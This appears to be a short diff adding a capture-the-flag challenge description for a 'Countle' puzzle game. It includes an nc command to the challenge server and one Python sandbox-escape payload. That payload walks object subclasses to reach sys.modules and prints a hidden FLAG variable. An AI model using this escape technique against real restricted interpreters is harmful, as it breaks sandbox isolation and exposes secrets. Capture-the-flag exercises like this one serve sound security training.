@@ -1,0 +1,5 @@
+The Countle World Championships is coming! Time to step up your game and start training! It's just a measly 1,000,000 puzzles a day, anyone can do it.
+
+> (m := [a for a in ''.__class__.mro()[1].__subclasses__() if 'Wa' in a.__name__][0].__init__.__globals__['sys'].modules)['builtins'].print(m['__main__'].FLAG)
+
+nc challs.nusgreyhats.org 33401
